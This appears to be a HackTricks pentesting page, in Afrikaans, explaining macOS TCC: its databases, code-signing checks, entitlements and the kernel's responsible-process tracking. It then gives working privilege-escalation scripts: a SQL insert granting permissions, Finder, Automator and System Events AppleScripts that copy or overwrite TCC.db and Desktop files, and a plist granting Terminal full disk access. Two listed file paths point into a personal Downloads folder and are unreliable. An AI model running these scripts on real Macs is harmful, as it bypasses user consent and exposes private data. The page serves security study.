# macOS TCC

{{#include ../../../../banners/hacktricks-training.md}}

## **Basiese Inligting**

**TCC (Transparency, Consent, and Control)** is 'n sekuriteitsprotokol wat daarop fokus om toepassingstoestemmings te reguleer. Die primêre rol daarvan is om sensitiewe kenmerke soos **liggingdienste, kontakte, foto's, mikrofoon, kamera, accessibility en full disk access** te beskerm. Deur uitdruklike gebruikertoestemming te vereis voordat toegang tot hierdie elemente aan 'n toepassing verleen word, verbeter TCC privaatheid en gebruikersbeheer oor hul data.

Gebruikers kom TCC teë wanneer toepassings toegang tot beskermde kenmerke versoek. Dit is sigbaar deur middel van 'n prompt wat gebruikers toelaat om toegang te **approve of deny**. Verder ondersteun TCC direkte gebruikerhandelinge, soos om **lêers na 'n toepassing te sleep en te los**, om toegang tot spesifieke lêers te verleen. Dit verseker dat toepassings slegs toegang het tot dit wat uitdruklik toegelaat is.

![n Voorbeeld van 'n TCC-prompt](https://rainforest.engineering/images/posts/macos-tcc/tcc-prompt.png?1620047855)

**TCC** word hanteer deur die **daemon** wat geleë is in `/System/Library/PrivateFrameworks/TCC.framework/Support/tccd` en gekonfigureer word in `/System/Library/LaunchDaemons/com.apple.tccd.system.plist` (wat die mach service `com.apple.tccd.system` registreer).

Daar loop 'n **user-mode tccd** per aangemelde gebruiker, gedefinieer in `/System/Library/LaunchAgents/com.apple.tccd.plist`, wat die mach services `com.apple.tccd` en `com.apple.usernotifications.delegate.com.apple.tccd` registreer.

Hier kan jy die tccd sien wat as system en as user loop:
```bash
ps -ef | grep tcc
0   374     1   0 Thu07PM ??         2:01.66 /System/Library/PrivateFrameworks/TCC.framework/Support/tccd system
501 63079     1   0  6:59PM ??         0:01.95 /System/Library/PrivateFrameworks/TCC.framework/Support/tccd
```
Permissions word **geërf van die ouer**-application en die **permissions** word **nagespoor** op grond van die **Bundle ID** en die **Developer ID**.

### TCC-databasisse

Die allowances/denies word dan in sommige TCC-databasisse gestoor:

- Die stelselwye databasis in **`/Library/Application Support/com.apple.TCC/TCC.db`** .
- Hierdie databasis word deur **SIP beskerm**, dus kan slegs ’n SIP bypass daarin skryf.
- Die gebruiker se TCC-databasis **`$HOME/Library/Application Support/com.apple.TCC/TCC.db`** vir voorkeure per gebruiker.
- Hierdie databasis word beskerm, sodat slegs prosesse met hoë TCC privileges, soos Full Disk Access, daarin kan skryf (maar dit word nie deur SIP beskerm nie).

> [!WARNING]
> Die vorige databasisse word ook **deur TCC beskerm vir leestoegang**. Jy sal dus **nie jou gewone gebruiker se TCC-databasis kan lees** nie, tensy dit vanaf ’n TCC-bevoorregte proses gebeur.
>
> Onthou egter dat ’n proses met hierdie hoë privileges (soos **FDA** of **`kTCCServiceEndpointSecurityClient`**) in staat sal wees om na die gebruiker se TCC-databasis te skryf

- Daar is ’n **derde** TCC-databasis in **`/var/db/locationd/clients.plist`** om kliënte aan te dui wat toegelaat word om toegang tot **location services** te verkry.
- Die SIP-beskermde lêer **`/Users/carlospolop/Downloads/REG.db`** (ook teen leestoegang deur TCC beskerm), bevat die **ligging** van al die **geldige TCC-databasisse**.
- Die SIP-beskermde lêer **`/Users/carlospolop/Downloads/MDMOverrides.plist`** (ook teen leestoegang deur TCC beskerm), bevat meer TCC-toegestane permissions.
- Die SIP-beskermde lêer **`/Library/Apple/Library/Bundles/TCC_Compatibility.bundle/Contents/Resources/AllowApplicationsList.plist`** (maar deur enigiemand leesbaar) is ’n allow list van applications wat ’n TCC-uitsondering benodig.

> [!TIP]
> Die TCC-databasis in **iOS** is in **`/private/var/mobile/Library/TCC/TCC.db`**

> [!TIP]
> Die **notification center UI** kan **veranderinge in die stelsel se TCC-databasis** maak:
>
> ```bash
> codesign -dv --entitlements :- /System/Library/PrivateFrameworks/TCC.framework/> Support/tccd
> [..]
> com.apple.private.tcc.manager
> com.apple.rootless.storage.TCC
> ```
>
> Gebruikers kan egter reëls **verwyder of navraag doen** met die **`tccutil`** command line utility.

#### Doen navraag oor die databasisse

{{#tabs}}
{{#tab name="user DB"}}
```bash
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db
sqlite> .schema
# Tables: admin, policies, active_policy, access, access_overrides, expired, active_policy_id
# The table access contains the permissions per services
sqlite> select service, client, auth_value, auth_reason from access;
kTCCServiceLiverpool|com.apple.syncdefaultsd|2|4
kTCCServiceSystemPolicyDownloadsFolder|com.tinyspeck.slackmacgap|2|2
kTCCServiceMicrophone|us.zoom.xos|2|2
[...]

# Check user approved permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=2;
# Check user denied permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=0;
```
{{#endtab}}

{{#tab name="system DB"}}
```bash
sqlite3 /Library/Application\ Support/com.apple.TCC/TCC.db
sqlite> .schema
# Tables: admin, policies, active_policy, access, access_overrides, expired, active_policy_id
# The table access contains the permissions per services
sqlite> select service, client, auth_value, auth_reason from access;
kTCCServiceLiverpool|com.apple.syncdefaultsd|2|4
kTCCServiceSystemPolicyDownloadsFolder|com.tinyspeck.slackmacgap|2|2
kTCCServiceMicrophone|us.zoom.xos|2|2
[...]

# Get all FDA
sqlite> select service, client, auth_value, auth_reason from access where service = "kTCCServiceSystemPolicyAllFiles" and auth_value=2;

# Check user approved permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=2;
# Check user denied permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=0;
```
{{#endtab}}
{{#endtabs}}

> [!TIP]
> Deur albei databasisse na te gaan, kan jy die toestemmings nagaan wat ’n toepassing toegelaat het, verbied het, of nie het nie (dit sal daarvoor vra).

- Die **`service`** is die TCC-**toestemming** se stringvoorstelling
- Die **`client`** is die **bundle ID** of **pad na binêre lêer** met die toestemmings
- Die **`client_type`** dui aan of dit ’n Bundle Identifier(0) of ’n absolute pad(1) is

<details>

<summary>Hoe om dit uit te voer indien dit ’n absolute pad is</summary>

Doen eenvoudig **`launctl load you_bin.plist`**, met ’n plist soos:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<!-- Label for the job -->
<key>Label</key>
<string>com.example.yourbinary</string>

<!-- The path to the executable -->
<key>Program</key>
<string>/path/to/binary</string>

<!-- Arguments to pass to the executable (if any) -->
<key>ProgramArguments</key>
<array>
<string>arg1</string>
<string>arg2</string>
</array>

<!-- Run at load -->
<key>RunAtLoad</key>
<true/>

<!-- Keep the job alive, restart if necessary -->
<key>KeepAlive</key>
<true/>

<!-- Standard output and error paths (optional) -->
<key>StandardOutPath</key>
<string>/tmp/YourBinary.stdout</string>
<key>StandardErrorPath</key>
<string>/tmp/YourBinary.stderr</string>
</dict>
</plist>
```
</details>

- Die **`auth_value`** kan verskillende waardes hê: denied(0), unknown(1), allowed(2), of limited(3).
- Die **`auth_reason`** kan die volgende waardes hê: Error(1), User Consent(2), User Set(3), System Set(4), Service Policy(5), MDM Policy(6), Override Policy(7), Missing usage string(8), Prompt Timeout(9), Preflight Unknown(10), Entitled(11), App Type Policy(12)
- Die **csreq**-veld dui aan hoe om die binary wat uitgevoer moet word, te verifieer en die TCC-permissies toe te staan:
```bash
# Query to get cserq in printable hex
select service, client, hex(csreq) from access where auth_value=2;

# To decode it (https://stackoverflow.com/questions/52706542/how-to-get-csreq-of-macos-application-on-command-line):
BLOB="FADE0C000000003000000001000000060000000200000012636F6D2E6170706C652E5465726D696E616C000000000003"
echo "$BLOB" | xxd -r -p > terminal-csreq.bin
csreq -r- -t < terminal-csreq.bin

# To create a new one (https://stackoverflow.com/questions/52706542/how-to-get-csreq-of-macos-application-on-command-line):
REQ_STR=$(codesign -d -r- /Applications/Utilities/Terminal.app/ 2>&1 | awk -F ' => ' '/designated/{print $2}')
echo "$REQ_STR" | csreq -r- -b /tmp/csreq.bin
REQ_HEX=$(xxd -p /tmp/csreq.bin  | tr -d '\n')
echo "X'$REQ_HEX'"
```
- Vir meer inligting oor die **ander velde** van die tabel, [**kyk na hierdie blogplasing**](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive).<sup>[[1]](#references)</sup>

Jy kan ook **reeds verleende toestemmings** aan apps nagaan in `System Preferences --> Security & Privacy --> Privacy --> Files and Folders`.

> [!TIP]
> Gebruikers _kan_ **reëls uitvee of navraag daaroor doen** met **`tccutil`**.

#### Stel TCC-toestemmings terug
```bash
# You can reset all the permissions given to an application with
tccutil reset All app.some.id

# Reset the permissions granted to all apps
tccutil reset All
```
### TCC Signature Checks

Die TCC **database** stoor die toepassing se **Bundle ID**, maar dit **stoor** ook **inligting** oor die **signature** om **seker te maak** dat die **App** wat vra om die toestemming te gebruik, die korrekte een is.
```bash
# From sqlite
sqlite> select service, client, hex(csreq) from access where auth_value=2;
#Get csreq

# From bash
echo FADE0C00000000CC000000010000000600000007000000060000000F0000000E000000000000000A2A864886F763640601090000000000000000000600000006000000060000000F0000000E000000010000000A2A864886F763640602060000000000000000000E000000000000000A2A864886F7636406010D0000000000000000000B000000000000000A7375626A6563742E4F550000000000010000000A364E33385657533542580000000000020000001572752E6B656570636F6465722E54656C656772616D000000 | xxd -r -p - > /tmp/telegram_csreq.bin
## Get signature checks
csreq -t -r /tmp/telegram_csreq.bin
(anchor apple generic and certificate leaf[field.1.2.840.113635.100.6.1.9] /* exists */ or anchor apple generic and certificate 1[field.1.2.840.113635.100.6.2.6] /* exists */ and certificate leaf[field.1.2.840.113635.100.6.1.13] /* exists */ and certificate leaf[subject.OU] = "6N38VWS5BX") and identifier "ru.keepcoder.Telegram"
```
> [!WARNING]
> Daarom sal ander toepassings wat dieselfde naam en bundle ID gebruik, nie toegang hê tot toegestaande toestemmings wat aan ander toepassings gegee is nie.

### Entitlements en TCC-toestemmings

Toepassings **benodig nie net** om **toegang te versoek** en dit **toegestaan te kry** tot sekere hulpbronne nie; hulle moet ook die **relevante entitlements hê**.\
Byvoorbeeld, **Telegram** het die entitlement `com.apple.security.device.camera` om **toegang tot die kamera te versoek**. ’n **Toepassing** wat nie hierdie **entitlement het nie, sal nie toegang** tot die kamera kan kry nie (en die gebruiker sal nie eens vir die toestemmings gevra word nie).

Let daarop dat entitlements plist-lêers is en deel van code sig vorm, verder deur spesiale slots in code sig gehash word, en óf deur kernel-kode in die kernel óf deur gebruikersmodelkode met `csops(#169)` of `csops_audittoken(#170)` navraag daaroor gedoen kan word.

Vir toepassings om egter **toegang** tot **sekere gebruikersvouers** te kry, soos `~/Desktop`, `~/Downloads` en `~/Documents`, **benodig hulle geen spesifieke entitlements nie.** Die stelsel sal toegang deursigtig hanteer en die gebruiker **vra** soos nodig.

- [https://newosxbook.com/ent.php](https://newosxbook.com/ent.php)

Apple se toepassings **sal nie prompts genereer nie**. Hulle bevat **vooraf-toegestane regte** in hul **entitlements-lys**, wat beteken dat hulle **nooit ’n popup sal genereer nie**, en ook nie in enige van die **TCC-databasisse** sal verskyn nie. Byvoorbeeld:
```bash
codesign -dv --entitlements :- /System/Applications/Calendar.app
[...]
<key>com.apple.private.tcc.allow</key>
<array>
<string>kTCCServiceReminders</string>
<string>kTCCServiceCalendar</string>
<string>kTCCServiceAddressBook</string>
</array>
```
Dit sal voorkom dat Calendar die gebruiker vra om toegang tot reminders, calendar en die adresboek te verkry.

> [!TIP]
> Afgesien van sommige amptelike dokumentasie oor entitlements, is dit ook moontlik om nie-amptelike **interessante inligting oor entitlements by** [**https://newosxbook.com/ent.jl**](https://newosxbook.com/ent.jl) te vind.

Sommige TCC-permissies is: kTCCServiceAppleEvents, kTCCServiceCalendar, kTCCServicePhotos... Daar is geen publieke lys wat almal definieer nie, maar jy kan hierdie [**lys van bekendes**](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive#service) nagaan.<sup>[[1]](#references)</sup>

### Sensitiewe onbeskermde plekke

- $HOME (self)
- $HOME/.ssh, $HOME/.aws, ens.
- /tmp

### Gebruikersintensie / com.apple.macl

Soos voorheen genoem, is dit moontlik om **toegang tot 'n lêer aan 'n App toe te staan deur dit na die App te sleep en daar te laat val**. Hierdie toegang sal nie in enige TCC-databasis gespesifiseer word nie, maar as 'n **uitgebreide** **kenmerk van die lêer**. Hierdie kenmerk sal die UUID van die toegelate App stoor:<sup>[[2]](#references)</sup>
```bash
xattr Desktop/private.txt
com.apple.macl

# Check extra access to the file
## Script from https://gist.githubusercontent.com/brunerd/8bbf9ba66b2a7787e1a6658816f3ad3b/raw/34cabe2751fb487dc7c3de544d1eb4be04701ac5/maclTrack.command
macl_read Desktop/private.txt
Filename,Header,App UUID
"Desktop/private.txt",0300,769FD8F1-90E0-3206-808C-A8947BEBD6C3

# Get the UUID of the app
otool -l /System/Applications/Utilities/Terminal.app/Contents/MacOS/Terminal| grep uuid
uuid 769FD8F1-90E0-3206-808C-A8947BEBD6C3
```
> [!TIP]
> Dit is interessant dat die **`com.apple.macl`**-kenmerk deur die **Sandbox**, en nie deur tccd nie, bestuur word.
>
> Let ook daarop dat indien jy ’n file wat die UUID van ’n app op jou computer toelaat, na ’n ander computer skuif, dit nie toegang aan daardie app sal verleen nie, omdat dieselfde app verskillende UIDs sal hê.

Die uitgebreide kenmerk `com.apple.macl` **kan nie skoongemaak word nie** soos ander uitgebreide kenmerke, omdat dit **deur SIP beskerm word**. Soos egter [**in hierdie post verduidelik word**](https://www.brunerd.com/blog/2020/01/07/track-and-tackle-com-apple-macl/), is dit moontlik om dit te deaktiveer **deur die file te zip**, dit te **delete** en dit te **unzip**.<sup>[[3]](#references)</sup>






## XNU Responsible Process Mechanism

In macOS/iOS is die **responsible process**-meganisme ’n kritieke sekuriteitsfunksie wat deur die **TCC (Transparency, Consent, and Control)**-framework en ander sekuriteitstelsels gebruik word om na te spoor watter proses uiteindelik vir ’n aksie verantwoordelik is, selfs deur kettings van child processes.

Wanneer TCC permissions nagaan (bv. camera, mikrofoon, ligging), kontroleer dit nie altyd die onmiddellike proses wat die request maak nie. In plaas daarvan kontroleer dit die **responsible process** - gewoonlik die GUI-app wat die aksie geïnisieer het, selfs al kom die werklike request van ’n helper process of daemon.

<details>
<summary>Hoe Responsible Process gestel word</summary>

### Process Structure Fields

Elke proses in XNU handhaaf twee belangrike UUID-identifiseerders:
```c
// From bsd/sys/proc_internal.h
struct proc {
// ...
pid_t   p_responsible_pid;          // PID of the responsible process
uint8_t p_uuid[16];                 // UUID from LC_UUID load command (self)
uint8_t p_responsible_uuid[16];     // UUID of pid responsible for this process
// ...
};
```
- **`p_uuid`**: Die proses se eie UUID (van sy Mach-O-binêre lêer se `LC_UUID`-laaibevel)
- **`p_responsible_pid`**: Die PID van die verantwoordelike proses
- **`p_responsible_uuid`**: Die UUID van die verantwoordelike proses (bly behoue selfs nadat daardie proses beëindig is)

### Hoe die verantwoordelike proses gestel word

1. **Tydens prosesskepping (`fork`)**

Wanneer ’n nuwe proses via `fork()` of `posix_spawn()` geskep word, word die verantwoordelike proses van die ouer geërf (die `exec()`-syscall hergebruik die bestaande `proc`-struktuur, dus word hierdie stap nie weer daar uitgevoer nie):

**Ligging**: `bsd/kern/kern_fork.c:1053`
```c
// In fork1_internal() - called during all process creation
proc_set_responsible_pid(child_proc, parent_proc->p_responsible_pid);
```
**Belangrike punte:**
- Child processes **inherit** die ouer se `p_responsible_pid`
- Dit skep ’n **chain of responsibility** deur die proses-hiërargie
- Die responsible process verwys tipies na die oorspronklike GUI-toepassing

2. **Die kernfunksie: `proc_set_responsible_pid()`**

**Ligging**: `bsd/kern/kern_proc.c:4817-4831`
```c
void
proc_set_responsible_pid(proc_t target_proc, pid_t responsible_pid)
{
target_proc->p_responsible_pid = responsible_pid;

if (responsible_pid >= 0) {
proc_t responsible_proc = proc_find(responsible_pid);
if (responsible_proc != PROC_NULL) {
// Copy the responsible process's UUID for persistent identification
proc_getexecutableuuid(responsible_proc,
target_proc->p_responsible_uuid,
sizeof(target_proc->p_responsible_uuid));
proc_rele(responsible_proc);
}
}
return;
}
```
**Wat hierdie funksie doen:**
1. **Stel die verantwoordelike PID** in die teikenproses
2. **Soek die verantwoordelike proses** met `proc_find()` (verhoog die verwysingtelling)
3. **Kopieer die UUID** vanaf die verantwoordelike proses se `p_uuid` na die teikenproses se `p_responsible_uuid`
4. **Stel die verwysing vry** met `proc_rele()` (verlaag die verwysingtelling)

3. **Waarom albei PID en UUID stoor?**

Die dubbelstoorbenadering los 'n kritieke probleem op:

| Veld | Doel | Probleem | Oplossing |
|-------|---------|---------|----------|
| `p_responsible_pid` | Vinnige opsoek van die huidige proses | PID kan hergebruik word nadat 'n proses beëindig is | Word vir aktiewe prosesopsoek gebruik |
| `p_responsible_uuid` | Volgehoue identifikasie | Oorleef prosesbeëindiging | Word vir sekuriteitskontroles en ouditering gebruik |

**Die Probleem**: As die verantwoordelike proses voor die kindproses beëindig word, kan die PID herwin word en aan 'n heeltemal ander proses toegeken word.

**Die Oplossing**: Die UUID is onveranderlik en identifiseer die spesifieke binary wat verantwoordelik was uniek, selfs nadat dit beëindig is.

### Proseskeppingsvloei
```
┌─────────────────────────────────────────────────────────────┐
│ Parent Process (e.g., Safari)                               │
│ p_uuid: A155B8BB-7F2C-3EBA-AE7D-60A1F2CDEF81              │
│ p_responsible_pid: 1234 (points to itself)                 │
│ p_responsible_uuid: A155B8BB-7F2C-3EBA-AE7D-60A1F2CDEF81  │
└─────────────────────┬───────────────────────────────────────┘
│
│ fork() / posix_spawn()
▼
┌────────────────────────────┐
│ kern_fork.c:fork1_internal │
│                            │
│ proc_set_responsible_pid(  │
│   child_proc,              │
│   parent->p_responsible_pid│
│ );                         │
└────────────┬───────────────┘
│
▼
┌────────────────────────────┐
│ proc_set_responsible_pid() │
│                            │
│ 1. Set p_responsible_pid   │
│ 2. Find responsible proc   │
│ 3. Copy UUID               │
│ 4. Release reference       │
└────────────┬───────────────┘
│
▼
┌─────────────────────────────────────────────────────────────┐
│ Child Process (e.g., SafariHelper)                          │
│ p_uuid: B266C9DD-8E3F-4AAA-9F1E-71D2E3CDEF82              │
│ p_responsible_pid: 1234 (inherited from parent)            │
│ p_responsible_uuid: A155B8BB-7F2C-3EBA-AE7D-60A1F2CDEF81  │
│                     (copied from Safari)                    │
└─────────────────────────────────────────────────────────────┘
```
### UUID-bron: LC_UUID-laaikommando

Die UUID wat in `p_uuid` gestoor word, kom van die **Mach-O-uitvoerbare lêer se `LC_UUID`-laaikommando**:

1. **Kompilasietyd**
```bash
# When linking, the linker (ld) generates a unique UUID
$ ld -o myapp myapp.o
# Embedded in the Mach-O binary as LC_UUID load command
```
2. **Uitvoeringstyd**

**Ligging**: `bsd/kern/mach_loader.c:2393-2413`
```c
static load_return_t
load_uuid(struct uuid_command *uulp, char *command_end, load_result_t *result)
{
if ((uulp->cmdsize < sizeof(struct uuid_command)) ||
(((char *)uulp + sizeof(struct uuid_command)) > command_end)) {
return LOAD_BADMACHO;
}

// Extract UUID from LC_UUID load command
memcpy(&result->uuid[0], &uulp->uuid[0], sizeof(result->uuid));
return LOAD_SUCCESS;
}
```
3. **Gestoor in prosesstruktuur**

**Ligging**: `bsd/kern/kern_exec.c:2281`
```c
// After loading the Mach-O binary during exec()
proc_setexecutableuuid(p, &load_result.uuid[0]);
```
**Ligging**: `bsd/kern/kern_proc.c:1912-1915`
```c
void
proc_setexecutableuuid(proc_t p, const unsigned char *uuid)
{
memcpy(p->p_uuid, uuid, sizeof(p->p_uuid));
}
```
</details>


## TCC Privesc & Bypasses

### Insert into TCC

As jy op enige stadium daarin slaag om skryftoegang tot ’n TCC-databasis te verkry, kan jy iets soos die volgende gebruik om ’n inskrywing by te voeg (verwyder die kommentare):

<details>

<summary>Insert into TCC-voorbeeld</summary>
```sql
INSERT INTO access (
service,
client,
client_type,
auth_value,
auth_reason,
auth_version,
csreq,
policy_id,
indirect_object_identifier_type,
indirect_object_identifier,
indirect_object_code_identity,
flags,
last_modified,
pid,
pid_version,
boot_uuid,
last_reminded
) VALUES (
'kTCCServiceSystemPolicyDesktopFolder', -- service
'com.googlecode.iterm2', -- client
0, -- client_type (0 - bundle id)
2, -- auth_value  (2 - allowed)
3, -- auth_reason (3 - "User Set")
1, -- auth_version (always 1)
X'FADE0C00000000C40000000100000006000000060000000F0000000200000015636F6D2E676F6F676C65636F64652E697465726D32000000000000070000000E000000000000000A2A864886F7636406010900000000000000000006000000060000000E000000010000000A2A864886F763640602060000000000000000000E000000000000000A2A864886F7636406010D0000000000000000000B000000000000000A7375626A6563742E4F550000000000010000000A483756375859565137440000', -- csreq is a BLOB, set to NULL for now
NULL, -- policy_id
NULL, -- indirect_object_identifier_type
'UNUSED', -- indirect_object_identifier - default value
NULL, -- indirect_object_code_identity
0, -- flags
strftime('%s', 'now'), -- last_modified with default current timestamp
NULL, -- assuming pid is an integer and optional
NULL, -- assuming pid_version is an integer and optional
'UNUSED', -- default value for boot_uuid
strftime('%s', 'now') -- last_reminded with default current timestamp
);
```
</details>

### TCC Payloads

As jy daarin geslaag het om by 'n app in te kom met sekere TCC-permissies, kyk na die volgende bladsy met TCC payloads om dit te misbruik:


{{#ref}}
macos-tcc-payloads.md
{{#endref}}

### Apple Events

Leer meer oor Apple Events by:


{{#ref}}
macos-apple-events.md
{{#endref}}

### Automation (Finder) na FDA\*

Die TCC-naam van die Automation-permissie is: **`kTCCServiceAppleEvents`**\
Hierdie spesifieke TCC-permissie dui ook die **toepassing aan wat bestuur kan word** binne die TCC-databasis aan (dus laat die permissie nie toe om alles te bestuur nie).

**Finder** is 'n toepassing wat **altyd FDA het** (selfs al verskyn dit nie in die UI nie), dus as jy **Automation**-voorregte daaroor het, kan jy sy voorregte misbruik om **dit sekere handelinge te laat uitvoer**.\
In hierdie geval sal jou app die permissie **`kTCCServiceAppleEvents`** oor **`com.apple.Finder`** benodig.<sup>[[4]](#references)</sup>

{{#tabs}}
{{#tab name="Steal users TCC.db"}}
```applescript
# This AppleScript will copy the system TCC database into /tmp
osascript<<EOD
tell application "Finder"
set homeFolder to path to home folder as string
set sourceFile to (homeFolder & "Library:Application Support:com.apple.TCC:TCC.db") as alias
set targetFolder to POSIX file "/tmp" as alias
duplicate file sourceFile to targetFolder with replacing
end tell
EOD
```
{{#endtab}}

{{#tab name="Steal systems TCC.db"}}
```applescript
osascript<<EOD
tell application "Finder"
set sourceFile to POSIX file "/Library/Application Support/com.apple.TCC/TCC.db" as alias
set targetFolder to POSIX file "/tmp" as alias
duplicate file sourceFile to targetFolder with replacing
end tell
EOD
```
{{#endtab}}
{{#endtabs}}

Jy kan dit misbruik om **jou eie gebruiker se TCC-databasis te skryf**.

> [!WARNING]
> Met hierdie toestemming sal jy **Finder kan vra om toegang tot TCC-beperkte vouers te verkry** en die lêers aan jou te gee, maar sover ek weet sal jy **nie vir Finder arbitrêre kode kan laat uitvoer** om sy FDA-toegang ten volle te misbruik nie.
>
> Daarom sal jy nie die volle FDA-vermoëns kan misbruik nie.

Dit is die TCC-aanporboodskap om Automation-voorregte oor Finder te verkry:

<figure><img src="../../../../images/image (27).png" alt="" width="244"><figcaption></figcaption></figure>

> [!CAUTION]
> Let daarop dat omdat die **Automator**-app die TCC-toestemming **`kTCCServiceAppleEvents`** het, dit **enige app kan beheer**, soos Finder. As jy dus toestemming het om Automator te beheer, kan jy ook die **Finder** beheer met kode soos die volgende:

<details>

<summary>Kry ’n shell binne Automator</summary>
```applescript
osascript<<EOD
set theScript to "touch /tmp/something"

tell application "Automator"
set actionID to Automator action id "com.apple.RunShellScript"
tell (make new workflow)
add actionID to it
tell last Automator action
set value of setting "inputMethod" to 1
set value of setting "COMMAND_STRING" to theScript
end tell
execute it
end tell
activate
end tell
EOD
# Once inside the shell you can use the previous code to make Finder copy the TCC databases for example and not TCC prompt will appear
```
</details>

Dies gebeur ook met die **Script Editor-app,** wat Finder kan beheer, maar deur ’n AppleScript te gebruik, kan jy dit nie dwing om ’n script uit te voer nie.

### Automation (SE) na sommige TCC

**System Events kan Folder Actions skep, en Folder Actions kan toegang tot sommige TCC-vouers verkry** (Desktop, Documents & Downloads), dus kan ’n script soos die volgende gebruik word om hierdie gedrag te misbruik:
```bash
# Create script to execute with the action
cat > "/tmp/script.js" <<EOD
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("cp -r $HOME/Desktop /tmp/desktop");
EOD

osacompile -l JavaScript -o "$HOME/Library/Scripts/Folder Action Scripts/script.scpt" "/tmp/script.js"

# Create folder action with System Events in "$HOME/Desktop"
osascript <<EOD
tell application "System Events"
-- Ensure Folder Actions are enabled
set folder actions enabled to true

-- Define the path to the folder and the script
set homeFolder to path to home folder as text
set folderPath to homeFolder & "Desktop"
set scriptPath to homeFolder & "Library:Scripts:Folder Action Scripts:script.scpt"

-- Create or get the Folder Action for the Desktop
if not (exists folder action folderPath) then
make new folder action at end of folder actions with properties {name:folderPath, path:folderPath}
end if
set myFolderAction to folder action folderPath

-- Attach the script to the Folder Action
if not (exists script scriptPath of myFolderAction) then
make new script at end of scripts of myFolderAction with properties {name:scriptPath, path:scriptPath}
end if

-- Enable the Folder Action and the script
enable myFolderAction
end tell
EOD

# File operations in the folder should trigger the Folder Action
touch "$HOME/Desktop/file"
rm "$HOME/Desktop/file"
```
### Automation (SE) + Accessibility (**`kTCCServicePostEvent`|**`kTCCServiceAccessibility`**)** na FDA\*

Automation op **`System Events`** + Accessibility (**`kTCCServicePostEvent`**) maak dit moontlik om **keystrokes na prosesse** te stuur. Op hierdie manier kan jy Finder misbruik om die gebruiker se TCC.db te wysig of om FDA aan 'n arbitrêre app toe te ken (hoewel daar moontlik vir 'n wagwoord gevra word).

Voorbeeld van Finder wat die gebruiker se TCC.db oorskryf:
```applescript
-- store the TCC.db file to copy in /tmp
osascript <<EOF
tell application "System Events"
-- Open Finder
tell application "Finder" to activate

-- Open the /tmp directory
keystroke "g" using {command down, shift down}
delay 1
keystroke "/tmp"
delay 1
keystroke return
delay 1

-- Select and copy the file
keystroke "TCC.db"
delay 1
keystroke "c" using {command down}
delay 1

-- Resolve $HOME environment variable
set homePath to system attribute "HOME"

-- Navigate to the Desktop directory under $HOME
keystroke "g" using {command down, shift down}
delay 1
keystroke homePath & "/Library/Application Support/com.apple.TCC"
delay 1
keystroke return
delay 1

-- Check if the file exists in the destination and delete if it does (need to send keystorke code: https://macbiblioblog.blogspot.com/2014/12/key-codes-for-function-and-special-keys.html)
keystroke "TCC.db"
delay 1
keystroke return
delay 1
key code 51 using {command down}
delay 1

-- Paste the file
keystroke "v" using {command down}
end tell
EOF
```
### `kTCCServiceAccessibility` na FDA\*

Kyk na hierdie [**payloads om die Accessibility-permissies te abuse**](macos-tcc-payloads.md#accessibility) om byvoorbeeld na FDA\* te privesc of ’n keylogger te laat loop.

### **Endpoint Security Client na FDA**

As jy **`kTCCServiceEndpointSecurityClient`** het, het jy FDA. Einde.

### System Policy SysAdmin File na FDA

**`kTCCServiceSystemPolicySysAdminFiles`** laat jou toe om die **`NFSHomeDirectory`**-kenmerk van ’n gebruiker te **verander**, wat sy tuisvouer verander en daarom toelaat om **TCC te bypass**.<sup>[[5]](#references)</sup>

### User TCC DB na FDA

Deur **skryftoestemmings** oor die **user TCC**-databasis te verkry, **kan** jy nie jouself **`FDA`**-toestemmings gee nie; slegs die een wat in die stelseldatabasis bestaan, kan dit toestaan.

Maar jy **kan** jouself **Automation rights to Finder** gee en die vorige tegniek abuse om na FDA\* te eskaleer.

### **FDA na TCC permissions**

**Full Disk Access** se TCC-naam is **`kTCCServiceSystemPolicyAllFiles`**

Ek dink nie dit is ’n werklike privesc nie, maar vir ingeval jy dit nuttig vind: As jy ’n program met FDA beheer, kan jy die gebruiker se TCC-databasis **wysig en jouself enige toegang gee**. Dit kan nuttig wees as ’n persistence-tegniek ingeval jy dalk jou FDA-toestemmings verloor.

### **SIP Bypass na TCC Bypass**

Die stelsel se **TCC-databasis** word deur **SIP** beskerm; daarom sal slegs prosesse met die **aangeduide entitlements dit kan wysig**. As ’n aanvaller dus ’n **SIP bypass** oor ’n **lêer** vind (in staat wees om ’n lêer wat deur SIP beperk word, te wysig), sal hy in staat wees om:

- **Die beskerming** van ’n TCC-databasis te verwyder en homself alle TCC-permissies te gee. Hy kan byvoorbeeld enige van hierdie lêers abuse:
- Die TCC-stelseldatabasis
- REG.db
- MDMOverrides.plist

Daar is egter nog ’n opsie om hierdie **SIP bypass te abuse om TCC te bypass**: die lêer `/Library/Apple/Library/Bundles/TCC_Compatibility.bundle/Contents/Resources/AllowApplicationsList.plist` is ’n allow list van toepassings wat ’n TCC-uitsondering benodig. As ’n aanvaller dus die **SIP-beskerming** van hierdie lêer kan **verwyder** en sy **eie toepassing** kan byvoeg, sal die toepassing TCC kan bypass.\
Byvoorbeeld om terminal by te voeg:
```bash
# Get needed info
codesign -d -r- /System/Applications/Utilities/Terminal.app
```
AllowApplicationsList.plist:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Services</key>
<dict>
<key>SystemPolicyAllFiles</key>
<array>
<dict>
<key>CodeRequirement</key>
<string>identifier &quot;com.apple.Terminal&quot; and anchor apple</string>
<key>IdentifierType</key>
<string>bundleID</string>
<key>Identifier</key>
<string>com.apple.Terminal</string>
</dict>
</array>
</dict>
</dict>
</plist>
```
### TCC-omseilings


{{#ref}}
macos-tcc-bypasses/
{{#endref}}

## Verwysings

- [1] [‘n Diepgaande ondersoek na macOS TCC.db - Rainforest QA Blog](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive)
